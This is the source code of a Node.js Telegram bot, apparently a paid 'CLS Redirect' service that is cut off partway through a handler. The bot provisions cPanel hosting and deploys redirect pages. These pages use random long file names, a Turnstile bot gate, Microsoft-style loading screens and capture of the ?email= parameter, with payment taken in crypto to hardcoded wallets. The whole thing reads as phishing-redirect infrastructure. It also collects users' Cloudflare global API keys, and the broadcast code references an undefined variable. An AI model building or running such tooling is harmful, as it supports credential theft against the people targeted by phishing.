// Load environment variables
try {
  require("dotenv").config();
  console.log("Environment variables loaded from .env file");
} catch (e) {
  console.log("Dotenv not available, using environment variables directly");
}
const { Telegraf } = require("telegraf");
const axios = require("axios");
const https = require("https");
const crypto = require("crypto");
const pino = require("pino");
const express = require("express");
const path = require("path");
const fs = require("fs");
const CloudflareConfig = require('./cloudflare-config');
const db = require('./db');
const auth = require('./auth');

// __dirname is available by default in CommonJS
const app = express();

// Middleware for parsing JSON
app.use(express.json());

// Rate limiting for all routes
app.use(auth.rateLimit({ windowMs: 60000, maxRequests: 100 }));

// Serve static files
app.use(express.static("."));
app.use('/assets', express.static("attached_assets"));

// Root route - redirect to dashboard
app.get("/", (_, res) => {
  res.redirect("/dashboard");
});

// Serve dashboard
app.get("/dashboard", (_, res) => {
  res.sendFile(path.join(__dirname, "dashboard.html"));
});

// Removed click tracking endpoint and related functions as per user request.

// Enhanced Logger with better formatting
let loggerConfig = {
  level: process.env.LOG_LEVEL || "info",
};

// Only add pretty printing in development and if available
if (process.env.NODE_ENV !== "production") {
  try {
    require("pino-pretty");
    loggerConfig.transport = {
      target: "pino-pretty",
      options: {
        colorize: true,
        translateTime: "HH:MM:ss",
        ignore: "pid,hostname",
      },
    };
  } catch (e) {
    // Fallback to basic logging if pino-pretty is not available
    console.log("Pino-pretty not available, using basic logging");
  }
}

const baseLog = pino(loggerConfig);
const L = (id) => baseLog.child({ reqId: id });

// Log startup information
const startupLog = L("startup");
startupLog.info("🚀 Domain Provisioning Bot starting...");
startupLog.info(`📊 Environment: ${process.env.NODE_ENV || "development"}`);
startupLog.info(`🔧 Log Level: ${process.env.LOG_LEVEL || "info"}`);
startupLog.info(`🌐 WHM Server: ${process.env.WHM_SERVER || "Not configured"}`);

// HTTPS Agent for self-signed certificates
const tlsAgent = new https.Agent({ rejectUnauthorized: false });

// Random helpers
const rInt = (a, b) => Math.floor(Math.random() * (b - a + 1)) + a;
const rStr = (l, s = "abcdefghijklmnopqrstuvwxyz0123456789") =>
  [...Array(l)].map(() => s[rInt(0, s.length - 1)]).join("");
const rFile = (extension = "html") => rStr(99) + "." + extension;

// Helper function to ensure directory exists
const ensureDirectory = (dirPath) => {
  if (!fs.existsSync(dirPath)) {
    fs.mkdirSync(dirPath, { recursive: true });
  }
};

// Helper function for error message formatting
const formatErrorMessage = (error, requestId) => 
  `❌ *CLS Redirect Creation Failed*\n\n` +
  `🔧 Technical Error: ${error.message}\n\n` +
  `💡 Don't worry! Use /start to try again.\n` +
  `🆔 Request ID: \`${requestId}\``;

// WHM API Client
const WHM = axios.create({
  baseURL: process.env.WHM_SERVER,
  httpsAgent: tlsAgent,
  timeout: 120000, // Increased to 2 minutes for cPanel account creation
  maxRetries: 2,
  headers: {
    Authorization:
      "Basic " +
      Buffer.from(
        `${process.env.WHM_USERNAME}:${process.env.WHM_PASSWORD}`,
        "utf8",
      ).toString("base64"),
  },
});

// Add request interceptor for retry logic
WHM.interceptors.response.use(
  (response) => response,
  async (error) => {
    const config = error.config;
    if (!config || !config.retry) {
      config.retry = 0;
    }

    if (config.retry < 2 && error.code === 'ECONNRESET') {
      config.retry++;
      console.log(`Retrying WHM request (attempt ${config.retry})`);
      return WHM(config);
    }

    return Promise.reject(error);
  }
);

// User sessions with rate limiting and cleanup
const sessions = new Map();
const rateLimits = new Map();

// Cleanup old sessions and rate limits every 10 minutes
setInterval(() => {
  const now = Date.now();

  // Clean up rate limits older than 1 hour
  for (const [userId, limit] of rateLimits.entries()) {
    if (now > limit.resetTime + 3600000) { // 1 hour
      rateLimits.delete(userId);
    }
  }

  // Clean up inactive sessions older than 30 minutes
  for (const [userId, session] of sessions.entries()) {
    if (!session.lastActivity || now - session.lastActivity > 1800000) { // 30 minutes
      sessions.delete(userId);
    }
  }

  console.log(`Cleaned up sessions. Active: ${sessions.size}, Rate limits: ${rateLimits.size}`);
}, 600000); // 10 minutes

function getSession(ctx) {
  try {
    if (!ctx || !ctx.from || !ctx.from.id) {
      console.error('Invalid context provided to getSession');
      return {};
    }

    const id = ctx.from.id;
    if (!sessions.has(id)) {
      sessions.set(id, { lastActivity: Date.now() });
    } else {
      sessions.get(id).lastActivity = Date.now();
    }
    return sessions.get(id);
  } catch (error) {
    console.error('Error getting session:', error);
    return {};
  }
}

function checkRateLimit(userId) {
  const now = Date.now();
  const userLimit = rateLimits.get(userId) || { count: 0, resetTime: now + 60000 };

  if (now > userLimit.resetTime) {
    userLimit.count = 1;
    userLimit.resetTime = now + 60000;
  } else {
    userLimit.count++;
  }

  rateLimits.set(userId, userLimit);
  return userLimit.count <= 3; // Max 3 requests per minute
}

// Post-creation tasks: Remove .htaccess and enable SSL
async function performPostCreationTasks(domain, username, log) {
  try {
    // Remove .htaccess file from public_html using cPanel API
    log.info({ domain, username }, "Removing .htaccess file");

    try {
      await WHM.get("/json-api/cpanel", {
        params: {
          cpanel_jsonapi_user: username,
          cpanel_jsonapi_apiversion: 2,
          cpanel_jsonapi_module: "Fileman",
          cpanel_jsonapi_func: "unlink",
          path: "public_html/.htaccess"
        }
      });
      log.info({ domain, username }, ".htaccess file removed successfully");
    } catch (htaccessError) {
      log.warn({ domain, username, error: htaccessError.message }, "Failed to remove .htaccess (may not exist)");
    }

    // Enable SSL/TLS for the domain
    log.info({ domain, username }, "Enabling SSL certificate");
    const sslParams = new URLSearchParams({
      domain: domain
    });

    try {
      await WHM.post("/json-api/start_autossl_check?api.version=1", sslParams);
      log.info({ domain, username }, "SSL certificate request initiated");
    } catch (sslError) {
      log.warn({ domain, username, error: sslError.message }, "Failed to initiate SSL certificate");
    }

  } catch (error) {
    log.error({ domain, username, error: error.message }, "Post-creation tasks failed");
  }
}

// Create WHM/cPanel account
async function createAccount(domain, log) {
  const user = (
    domain
      .replace(/[^a-zA-Z0-9]/g, "")
      .slice(0, 3)
      .toLowerCase() + rStr(5)
  ).slice(0, 8);

  const pass = rStr(
    14,
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()",
  );

  const params = new URLSearchParams({
    domain,
    username: user,
    password: pass,
    plan: process.env.WHM_PACKAGE_NAME || "pecuwoli_default",
  });

  log.info({ domain, user }, "Creating cPanel account");

  const { data } = await WHM.post("/json-api/createacct?api.version=1", params);

  if (!data?.metadata || data.metadata.result !== 1) {
    throw new Error(
      data?.metadata?.reason || "Failed to create cPanel account",
    );
  }

  log.info({ domain, user, ip: data.data.ip }, "Account created successfully");

  // Additional post-creation tasks
  await performPostCreationTasks(domain, user, log);

  return {
    user,
    password: pass,
    ip: data.data.ip,
  };
}

// Create directory in public_html
const createDirectory = (user, folderName) =>
  WHM.get("/json-api/cpanel", {
    params: {
      cpanel_jsonapi_user: user,
      cpanel_jsonapi_apiversion: 2,
      cpanel_jsonapi_module: "Fileman",
      cpanel_jsonapi_func: "mkdir",
      path: "public_html",
      name: folderName,
    },
  });

// Upload script file to directory
const uploadScriptFile = (user, folderName, fileName, htmlContent) =>
  WHM.post("/json-api/cpanel", null, {
    params: {
      cpanel_jsonapi_user: user,
      cpanel_jsonapi_apiversion: 3,
      cpanel_jsonapi_module: "Fileman",
      cpanel_jsonapi_func: "save_file_content",
      dir: `/home/${user}/public_html/${folderName}`,
      file: fileName,
      content: htmlContent,
      from_charset: "UTF-8",
      to_charset: "UTF-8",
    },
  });

// Generate custom script content using external template file
async function generateCustomScriptContent(redirectUrl, userId, turnstileKey = '0x4AAAAAAB5LyZflvKtbvXXa') {
  try {
    // Get user's template preference
    const userData = await getUserData(userId);
    const templateType = userData.templateType || 'html';

    console.log(`[generateCustomScriptContent] User ${userId} templateType from DB: "${templateType}"`);

    // Determine file extension and template file
    const isPhpTemplate = templateType === 'php';
    const extension = isPhpTemplate ? 'php' : 'html';
    const templateFileName = isPhpTemplate ? 'redirect-template-cloudflare.php' : 'redirect-template-plain.html';
    const templatePath = path.join(__dirname, templateFileName);

    console.log(`[generateCustomScriptContent] Using template file: ${templateFileName}, extension: ${extension}`);

    // Check if template file exists
    if (!fs.existsSync(templatePath)) {
      console.error(`[generateCustomScriptContent] Template file not found: ${templatePath}`);
      throw new Error(`Template file not found: ${templateFileName}`);
    }

    const templateContent = fs.readFileSync(templatePath, 'utf8');
    console.log(`[generateCustomScriptContent] Template loaded, size: ${templateContent.length} bytes`);

    // Replace placeholders with actual values
    let content = templateContent.replace(/\{\{REDIRECT_URL\}\}/g, redirectUrl);
    content = content.replace(/REDIRECT_URL_PLACEHOLDER/g, redirectUrl);
    content = content.replace(/\{\{TURNSTILE_KEY\}\}/g, turnstileKey);

    console.log(`[generateCustomScriptContent] Content generated, extension: ${extension}, starts with: ${content.substring(0, 50)}`);

    return { content, extension };
  } catch (error) {
    console.error('[generateCustomScriptContent] Error:', error);
    // Fallback to basic redirect if template file is not available
    return {
      content: `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <script>
        setTimeout(function() {
            window.location.href = "${redirectUrl}";
        }, 300);
    </script>
</head>
<body>
    <p>Redirecting...</p>
</body>
</html>`,
      extension: 'html'
    };
  }
}

// ==========================================
// PAYMENT PROCESSING HELPER FUNCTIONS
// ==========================================

// Helper function to process payment verification (eliminates duplicate code)
async function processPaymentVerification(ctx, paymentProof, screenshot = null, transactionHash = null) {
  const userId = ctx.from.id;
  const requestId = `PAY_${userId}_${Date.now()}`;

  // Store payment verification request in database
  const proofUrl = screenshot || null;
  const txHash = transactionHash || 'Provided via screenshot';

  const paymentRequest = await db.createPaymentRequest(userId, requestId, paymentProof.amount, proofUrl, txHash);

  if (!paymentRequest) {
    console.error(`Failed to create payment request for user ${userId}`);
    await ctx.reply('⚠️ Error processing your payment request. Please try again or contact support.');
    return null;
  }

  // Send to admin for approval
  try {
    const adminId = process.env.ADMIN_ID;
    const cryptoSymbol = paymentProof.cryptoType === 'BTC' ? 'BTC' : 'USDT';
    const network = paymentProof.cryptoType.includes('TRC20') ? ' [TRC20]' : 
                  paymentProof.cryptoType.includes('ERC20') ? ' [ERC20]' : '';

    const messageText = `💰 *Payment Verification Request*\n\n` +
            `👤 User: ${ctx.from.first_name || 'Unknown'} (${userId})\n` +
            `💵 Amount: $${paymentProof.amount}\n` +
            `₿ Crypto: ${cryptoSymbol}${network}\n` +
            `🔗 Hash: \`${transactionHash || 'See screenshot'}\`\n` +
            `🆔 ID: \`${requestId}\`\n\n` +
            `${screenshot ? '📸 Screenshot provided' : '📄 Transaction hash only'}\n` +
            `Please verify this payment:`;

    const keyboard = {
      inline_keyboard: [
        [
          { text: '✅ Approve Payment', callback_data: `approve_payment_${requestId}` },
          { text: '❌ Reject Payment', callback_data: `reject_payment_${requestId}` }
        ]
      ]
    };

    if (screenshot) {
      await bot.telegram.sendPhoto(adminId, screenshot, {
        caption: messageText,
        parse_mode: "Markdown",
        reply_markup: keyboard
      });
    } else {
      await bot.telegram.sendMessage(adminId, messageText, {
        parse_mode: "Markdown",
        reply_markup: keyboard
      });
    }
  } catch (adminError) {
    console.error("Failed to send payment verification to admin:", adminError.message);
  }

  return requestId;
}

// ==========================================
// CRYPTO PRICE API & TOP-UP FUNCTIONALITY
// ==========================================

// Admin user ID for notifications (now using process.env.ADMIN_ID like VIP access)

// Crypto wallet addresses
const CRYPTO_WALLETS = {
  BTC: "bc1qsttwav3g9p3fcvwhu0je2swttca5zyu7lq47hm",
  "USDT_TRC20": "TBQbur14oKop1THRNyy7rSJU9cbG2EPtC4",
  "USDT_ERC20": "0x6b298ED5767BE52aa7974a986aE0C4d41B70BE96"
};

// Fetch crypto prices from CoinGecko API (real-time only, no fallback)
async function fetchCryptoPrice(cryptoId) {
  try {
    const response = await axios.get(`https://api.coingecko.com/api/v3/simple/price?ids=${cryptoId}&vs_currencies=usd`, {
      timeout: 10000
    });

    if (response.data && response.data[cryptoId] && response.data[cryptoId].usd) {
      const price = response.data[cryptoId].usd;
      console.log(`Fetched real-time ${cryptoId} price: $${price}`);
      return price;
    }

    console.error(`No price data available for ${cryptoId} from API`);
    return null;

  } catch (error) {
    console.error(`Failed to fetch ${cryptoId} price from API:`, error.message);
    return null;
  }
}

// Calculate crypto amount needed for USD amount
async function calculateCryptoAmount(usdAmount, cryptoType) {
  try {
    if (!usdAmount || isNaN(usdAmount) || usdAmount <= 0) {
      console.error(`Invalid USD amount: ${usdAmount}`);
      return null;
    }

    const priceMap = {
      BTC: 'bitcoin',
      USDT_TRC20: 'tether',
      USDT_ERC20: 'tether'
    };

    const cryptoId = priceMap[cryptoType];

    if (!cryptoId) {
      console.error(`Unknown crypto type: ${cryptoType}`);
      return null;
    }

    const price = await fetchCryptoPrice(cryptoId);

    if (!price || isNaN(price) || price <= 0) {
      console.error(`Invalid price for ${cryptoId}: ${price}`);
      return null;
    }

    if (cryptoType.includes('USDT')) {
      return usdAmount.toFixed(2); // USDT is 1:1 with USD, 2 decimals
    } else {
      const amount = usdAmount / price;
      if (isNaN(amount) || !isFinite(amount)) {
        console.error(`Invalid calculation result for ${cryptoType}`);
        return null;
      }
      return amount.toFixed(8); // BTC with 8 decimals
    }
  } catch (error) {
    console.error(`Error calculating crypto amount:`, error);
    return null;
  }
}

// Generate top-up payment message for specific crypto
async function generateTopUpMessage(usdAmount, cryptoType) {
  const amount = await calculateCryptoAmount(usdAmount, cryptoType);
  if (!amount) {
    return "❌ Unable to fetch current crypto prices. Please try again.";
  }

  const wallet = CRYPTO_WALLETS[cryptoType];
  const cryptoSymbol = cryptoType === 'BTC' ? 'BTC' : 'USDT';
  const network = cryptoType.includes('TRC20') ? ' (TRC20)' : cryptoType.includes('ERC20') ? ' (ERC20)' : '';

  // Escape special Markdown characters in wallet address
  const escapedWallet = wallet.replace(/_/g, '\\_');

  return {
    text: `⚠️ *Please send the exact amount to the address below:*

*Address:* \`${escapedWallet}\`
*Amount:* ${amount} ${cryptoSymbol}${network}
*USD Value:* $${usdAmount}
*Status:* 🕜 WAITING FOR PAYMENT

❗️ *Ensure the funds are sent within 30 minutes*
🟢 *Click "I Paid" below after sending payment*
⚠️ *This address is valid for one-time use only*`,
    keyboard: {
      inline_keyboard: [
        [
          { text: '✅ I Paid', callback_data: `paid_${cryptoType}_${usdAmount}` },
          { text: '❌ Cancel', callback_data: 'cancel_payment' }
        ]
      ]
    }
  };
}

// ==========================================
// DATABASE INITIALIZATION
// ==========================================

// Initialize database tables on startup
async function initializeDatabase() {
  try {
    const schemaPath = path.join(__dirname, 'schema.sql');
    if (fs.existsSync(schemaPath)) {
      const schema = fs.readFileSync(schemaPath, 'utf8');
      await db.pool.query(schema);
      console.log('✅ Database tables initialized');
    }
  } catch (error) {
    console.error('❌ Database initialization error:', error.message);
  }
}

// Test database connection and initialize
initializeDatabase().then(async () => {
  const connected = await db.testConnection();
  if (!connected) {
    console.error('⚠️  Database connection failed - some features may not work');
  }
});

// ==========================================
// TELEGRAM BOT INITIALIZATION
// ==========================================

let bot = null;
if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_BOT_TOKEN !== "your_telegram_bot_token_here") {
  bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
  // Webhook will be set after server starts
}

// ==========================================
// DATA STORAGE & USER MANAGEMENT
// ==========================================

// PostgreSQL database functions (imported from db.js)
const loadUserData = db.loadUserData;
const saveUserData = db.saveUserData;
const loadUserHistory = db.loadUserHistory;
const saveUserHistory = db.saveUserHistory;

// Initialize admin access requests storage
const adminRequests = new Map();
const topupRequests = new Map();

async function getUserData(userId) {
  let userData = await loadUserData(userId);
  if (!userData) {
    userData = {
      id: userId,
      balance: 0,
      joinDate: new Date(),
      totalDomains: 0,
      templateType: 'html',
      subscription: {
        active: false,
        startDate: null,
        endDate: null,
        domainsUsed: 0,
        dailyDomainsUsed: 0,
        lastDomainDate: null,
        hasEverSubscribed: false
      }
    };
    await saveUserData(userId, userData);
  }

  // Ensure all required properties exist with proper defaults
  userData.id = userData.id || userId;
  userData.balance = (typeof userData.balance === 'number' && !isNaN(userData.balance)) ? userData.balance : 0;
  userData.totalDomains = (typeof userData.totalDomains === 'number' && !isNaN(userData.totalDomains)) ? userData.totalDomains : 0;
  userData.templateType = userData.templateType || 'html';
  userData.joinDate = userData.joinDate ? new Date(userData.joinDate) : new Date();

  // Ensure subscription object exists and has all required properties
  if (!userData.subscription || typeof userData.subscription !== 'object') {
    userData.subscription = {
      active: false,
      startDate: null,
      endDate: null,
      domainsUsed: 0,
      dailyDomainsUsed: 0,
      lastDomainDate: null,
      hasEverSubscribed: false
    };
  } else {
    // Validate and fix subscription properties
    userData.subscription.active = typeof userData.subscription.active === 'boolean' ? userData.subscription.active : false;
    userData.subscription.domainsUsed = (typeof userData.subscription.domainsUsed === 'number' && !isNaN(userData.subscription.domainsUsed)) ? userData.subscription.domainsUsed : 0;
    userData.subscription.dailyDomainsUsed = (typeof userData.subscription.dailyDomainsUsed === 'number' && !isNaN(userData.subscription.dailyDomainsUsed)) ? userData.subscription.dailyDomainsUsed : 0;
    userData.subscription.hasEverSubscribed = typeof userData.subscription.hasEverSubscribed === 'boolean' ? userData.subscription.hasEverSubscribed : false;

    // Validate dates
    if (userData.subscription.startDate && typeof userData.subscription.startDate === 'string') {
      userData.subscription.startDate = new Date(userData.subscription.startDate);
    }
    if (userData.subscription.endDate && typeof userData.subscription.endDate === 'string') {
      userData.subscription.endDate = new Date(userData.subscription.endDate);
    }
    if (userData.subscription.lastDomainDate && typeof userData.subscription.lastDomainDate === 'string') {
      userData.subscription.lastDomainDate = new Date(userData.subscription.lastDomainDate);
    }
  }

  // Reset daily limit if it's a new day
  if (userData.subscription.active && userData.subscription.lastDomainDate) {
    const today = new Date().toDateString();
    const lastUsedDate = new Date(userData.subscription.lastDomainDate).toDateString();

    if (today !== lastUsedDate) {
      console.log(`Resetting daily limit for user ${userId}. Last used: ${lastUsedDate}, Today: ${today}`);
      userData.subscription.dailyDomainsUsed = 0;
      userData.subscription.lastDomainDate = null;
      await saveUserData(userId, userData);
    }
  }

  // Check if subscription has expired
  if (userData.subscription.active && userData.subscription.endDate) {
    const now = new Date();
    const endDate = new Date(userData.subscription.endDate);
    if (now > endDate) {
      console.log(`Subscription expired for user ${userId}. End date was ${endDate.toISOString()}`);
      userData.subscription.active = false;
      userData.subscription.domainsUsed = 0;
      userData.subscription.dailyDomainsUsed = 0;
      userData.subscription.lastDomainDate = null;
      await saveUserData(userId, userData);
    }
  }

  return userData;
}

async function updateUserBalance(userId, newBalance) {
  const userData = await getUserData(userId);
  userData.balance = newBalance;
  await saveUserData(userId, userData);
  await db.updateUserBalance(userId, newBalance);
  console.log(`Updated balance for user ${userId}: $${newBalance.toFixed(2)}`);
}

async function addUserHistory(userId, historyItem) {
  await db.addUserHistory(userId, historyItem);
}

// ==========================================
// TELEGRAM BOT COMMAND HANDLERS
// ==========================================

if (bot) {
  // Start command with main menu
  bot.start(async (ctx) => {
    const session = getSession(ctx);
    const user = await getUserData(ctx.from.id);

    const log = L("start-command");
    log.info(
      {
        userId: ctx.from.id,
        username: ctx.from.username || "unknown",
        firstName: ctx.from.first_name || "unknown",
      },
      "👤 New user started bot interaction",
    );

    return ctx.reply(
      `🎯 *Redirect Bot*`,
      { 
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              { text: '💳 Top Up', callback_data: 'topup' },
              { text: '🎯 Create Redirect', callback_data: 'redirect' }
            ],
            [
              { text: '⭐ Monthly Subscription', callback_data: 'subscription' },
              { text: 'Domain Tester 🚥', url: 'https://t.me/clstes_bot' }
            ],
            [
              { text: '⚙️ Template Settings', callback_data: 'template_settings' },
              { text: '☁️ Cloudflare Security', callback_data: 'cloudflare_setup' }
            ],
            [
              { text: '🔑 VIP Access Request', callback_data: 'admin_access' }
            ]
          ]
        }
      }
    );
  });



  // Help command
  bot.help((ctx) => {
    return ctx.reply(
      "📋 *CLS Redirect Bot - Help Guide*\n\n" +
        "🎯 */start* - Launch the main menu\n" +
        "❓ */help* - Show this help guide\n" +
        "❌ */cancel* - Cancel current operation\n\n" +
        "✨ *How CLS Redirect Works:*\n" +
        "1️⃣ Send your domain + target URL\n" +
        "2️⃣ We create your redirect hosting instantly\n" +
        "3️⃣ Get 3 professional redirect scripts\n" +
        "4️⃣ Receive live URLs with SSL certificates\n\n" +
        "🎨 *Features:*\n" +
        "• Microsoft-style loading animations\n" +
        "• Email parameter capture (?email=)\n" +
        "• Instant SSL certificate setup\n" +
        "• Professional redirect pages",
      { parse_mode: "Markdown" },
    );
  });

  // Cancel command
  bot.command("cancel", (ctx) => {
    const session = getSession(ctx);
    sessions.delete(ctx.from.id);

    return ctx.reply("❌ Operation cancelled. Use /start to begin again.");
  });

  // Broadcast command (Admin only)
  bot.command("broadcast", async (ctx) => {
    // Check if user is admin
    if (!process.env.ADMIN_ID || ctx.from.id.toString() !== process.env.ADMIN_ID) {
      return ctx.reply("❌ This command is only available to administrators.");
    }

    const session = getSession(ctx);
    session.awaiting_broadcast = true;

    return ctx.reply(
      "📢 *Broadcast Message*\n\n" +
      "Send me the message you want to broadcast to all users.\n\n" +
      "You can use Markdown formatting:\n" +
      "• *bold text*\n" +
      "• _italic text_\n" +
      "• `code`\n" +
      "• [link](url)\n\n" +
      "Send /cancel to abort.",
      { parse_mode: "Markdown" }
    );
  });

  // ==========================================
  // PHOTO MESSAGE HANDLERS
  // ==========================================

  bot.on('photo', async (ctx) => {
    const session = getSession(ctx);

    // Admin setting template reference image
    if (session.awaiting_template_image) {
      // Check if user is admin
      if (!process.env.ADMIN_ID || ctx.from.id.toString() !== process.env.ADMIN_ID) {
        delete session.awaiting_template_image;
        return ctx.reply("❌ This action is only available to administrators.");
      }

      const templateType = session.awaiting_template_image;
      const photo = ctx.message.photo[ctx.message.photo.length - 1];
      const photoFileId = photo.file_id;

      // Save to database
      const success = await db.setTemplateReferenceImage(templateType, photoFileId);

      delete session.awaiting_template_image;

      if (success) {
        const templateName = templateType === 'html' ? 'Plain Redirect Template' : 'Cloudflare Template';
        await ctx.reply(
          `✅ *Reference Image Set!*\n\n` +
          `Template: ${templateName}\n` +
          `Image has been saved successfully.\n\n` +
          `Users will now see this image when selecting this template.`,
          { parse_mode: "Markdown" }
        );
      } else {
        await ctx.reply("❌ Failed to save reference image. Please try again.");
      }
      return;
    }

    if (session.awaiting_payment_proof) {
      // Get the highest resolution photo
      const photo = ctx.message.photo[ctx.message.photo.length - 1];
      const photoFileId = photo.file_id;

      // Get transaction hash from caption (optional)
      const transactionHash = ctx.message.caption?.trim();

      const paymentProof = session.awaiting_payment_proof;

      // Clear the session
      delete session.awaiting_payment_proof;

      // Use helper function to process payment verification
      const requestId = await processPaymentVerification(ctx, paymentProof, photoFileId, transactionHash);

      await ctx.reply(
        `✅ *Payment Verification Submitted*\n\n` +
        `🆔 Request ID: \`${requestId}\`\n\n` +
        `Your payment proof has been sent to admin for verification.\n` +
        `You will be notified once it's approved or rejected.\n\n` +
        `If approved, $${paymentProof.amount} will be added to your balance.`,
        { parse_mode: "Markdown" }
      );
      return;
    }

    await ctx.reply("❌ Please use the menu options to navigate.");
  });

  // ==========================================
  // TEXT MESSAGE HANDLERS
  // ==========================================

  bot.on("text", async (ctx) => {
    const session = getSession(ctx);
    const text = ctx.message.text.trim();

    // Cloudflare credentials input (email and key together)
    if (session.awaiting_cloudflare_credentials) {
      const parts = text.trim().split(/\s+/);

      if (parts.length !== 2) {
        return ctx.reply(
          `❌ Invalid format. Please send both email and API key:\n\n` +
          `Format: \`email@example.com YOUR_GLOBAL_API_KEY\``,
          { parse_mode: "Markdown" }
        );
      }

      const [email, globalKey] = parts;
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

      if (!emailRegex.test(email)) {
        return ctx.reply(
          `❌ Invalid email format. Please check and try again:\n\n` +
          `Format: \`email@example.com YOUR_GLOBAL_API_KEY\``,
          { parse_mode: "Markdown" }
        );
      }

      if (globalKey.length < 30) {
        return ctx.reply(
          `❌ Invalid API key format. Please check and try again:\n\n` +
          `Format: \`email@example.com YOUR_GLOBAL_API_KEY\``,
          { parse_mode: "Markdown" }
        );
      }

      session.awaiting_cloudflare_credentials = false;

      // Initialize Cloudflare client
      const cf = new CloudflareConfig(email, globalKey);

      try {
        // Fetch domains
        const statusMsg = await ctx.reply("🔄 Fetching your domains from Cloudflare...");
        const domains = await cf.listDomains();

        if (domains.length === 0) {
          delete session.cloudflare_email;
          return ctx.telegram.editMessageText(
            ctx.chat.id,
            statusMsg.message_id,
            null,
            "❌ No domains found in your Cloudflare account."
          );
        }

        // Store credentials in session
        session.cloudflare_client = cf;

        // Create domain selection keyboard
        const keyboard = domains.map(domain => [{
          text: `🌐 ${domain.name} (${domain.status})`,
          callback_data: `cf_select_${domain.id}`
        }]);
        keyboard.push([{ text: '❌ Cancel', callback_data: 'cancel_cloudflare' }]);

        await ctx.telegram.editMessageText(
          ctx.chat.id,
          statusMsg.message_id,
          null,
          `✅ *Found ${domains.length} domain(s)*\n\n` +
          `Select a domain to configure security settings:`,
          {
            parse_mode: "Markdown",
            reply_markup: { inline_keyboard: keyboard }
          }
        );

      } catch (error) {
        delete session.cloudflare_email;
        return ctx.reply(
          `❌ *Cloudflare Authentication Failed*\n\n` +
          `Error: ${error.message}\n\n` +
          `Please verify your credentials and try again.`,
          { parse_mode: "Markdown" }
        );
      }

      return;
    }

    // Broadcast message input (Admin only)
    if (session.awaiting_broadcast) {
      session.awaiting_broadcast = false;

      const broadcastMessage = text;

      // Get all user IDs from database
      let userIds = [];

      try {
        const result = await db.pool.query('SELECT id FROM users');
        userIds = result.rows.map(row => row.id);
      } catch (error) {
        return ctx.reply("❌ Error reading user data. Please try again.");
      }

      if (userIds.length === 0) {
        return ctx.reply("❌ No users found in the database.");
      }

      const statusMsg = await ctx.reply(
        `📢 *Broadcasting Message*\n\n` +
        `👥 Total users: ${userIds.length}\n` +
        `⏳ Sending...`,
        { parse_mode: "Markdown" }
      );

      let successCount = 0;
      let failCount = 0;

      // Send message to all users
      for (const userId of userIds) {

        try {
          await bot.telegram.sendMessage(
            userId,
            `📢 *Announcement from Admin*\n\n${broadcastMessage}`,
            { parse_mode: "Markdown" }
          );
          successCount++;

          // Small delay to avoid rate limiting
          await new Promise(resolve => setTimeout(resolve, 50));
        } catch (error) {
          failCount++;
          console.log(`Failed to send broadcast to user ${userId}:`, error.message);
        }
      }

      // Update status message with results
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        statusMsg.message_id,
        null,
        `✅ *Broadcast Complete*\n\n` +
        `👥 Total users: ${userFiles.length}\n` +
        `✅ Sent successfully: ${successCount}\n` +
        `❌ Failed: ${failCount}\n\n` +
        `📝 Message:\n${broadcastMessage}`,
        { parse_mode: "Markdown" }
      );

      return;
    }

    // Transaction hash input for payment verification
    if (session.awaiting_payment_proof) {
      // Check if this looks like a transaction hash (flexible validation)
      if (text.length >= 10 && !text.includes(' ') && text.length <= 200) {
        const paymentProof = session.awaiting_payment_proof;

        // Clear the session
        delete session.awaiting_payment_proof;

        // Use helper function to process payment verification
        const requestId = await processPaymentVerification(ctx, paymentProof, null, text);

        await ctx.reply(
          `✅ *Payment Verification Submitted*\n\n` +
          `🆔 Request ID: \`${requestId}\`\n\n` +
          `Your transaction hash has been sent to admin for verification.\n` +
          `You will be notified once it's approved or rejected.\n\n` +
          `If approved, $${paymentProof.amount} will be added to your balance.`,
          { parse_mode: "Markdown" }
        );
        return;
      } else {
        await ctx.reply(
          `❌ Invalid hash format\n\nProvide screenshot or valid transaction hash (10+ chars, no spaces)`,
          { parse_mode: "Markdown" }
        );
        return;
      }
    }

    // Amount input for topup
    if (session.awaiting_amount) {
      session.awaiting_amount = false;

      const amount = parseFloat(text);
      if (isNaN(amount) || amount <= 0) {
        session.awaiting_amount = true;
        return ctx.reply(
          "❌ Invalid amount. Please enter a valid number:\n" +
          "Example: 50",
          { parse_mode: "Markdown" }
        );
      }

      // Show crypto selection for payment
      return ctx.reply(
        `💰 *Top-Up Amount: $${amount}*\n\nSelect your preferred payment method:`,
        {
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [
                { text: '₿ Bitcoin (BTC)', callback_data: `pay_BTC_${amount}` },
                { text: '💵 USDT (TRC20)', callback_data: `pay_USDT_TRC20_${amount}` }
              ],
              [
                { text: '💵 USDT (ERC20)', callback_data: `pay_USDT_ERC20_${amount}` },
                { text: '❌ Cancel', callback_data: 'cancel_topup' }
              ]
            ]
          }
        }
      );
    }

    // Domain input handling
    if (session.awaiting_domain) {
      session.awaiting_domain = false;

      // Parse domain, redirect URL, and optional Turnstile key
      const parts = text.trim().split(" ");
      if (parts.length < 2 || parts.length > 3) {
        session.awaiting_domain = true;
        return ctx.reply(
          "❌ Invalid format. Send domain, redirect URL, and Turnstile key:\n" +
            "Format: `domain.com https://fb.com YOUR_TURNSTILE_KEY`\n\n" +
            "Or without custom key: `domain.com https://fb.com`",
          { parse_mode: "Markdown" },
        );
      }

      const [domainInput, redirectUrl, turnstileKey = '0x4AAAAAAB5LyZflvKtbvXXa'] = parts;

      // Enhanced domain validation
      const domainRegex =
        /^[a-zA-Z0-9][a-zA-Z0-9-]{0,61}[a-zA-Z0-9]?\.[a-zA-Z]{2,}$/;
      if (!domainRegex.test(domainInput) || domainInput.includes('..') || domainInput.startsWith('-') || domainInput.endsWith('-')) {
        session.awaiting_domain = true;
        return ctx.reply(
          "❌ Invalid domain format. Please enter valid details:\n" +
            "Format: `domain.com https://fb.com YOUR_TURNSTILE_KEY`",
          { parse_mode: "Markdown" },
        );
      }

      // Check rate limit
      if (!checkRateLimit(ctx.from.id)) {
        session.awaiting_domain = true;
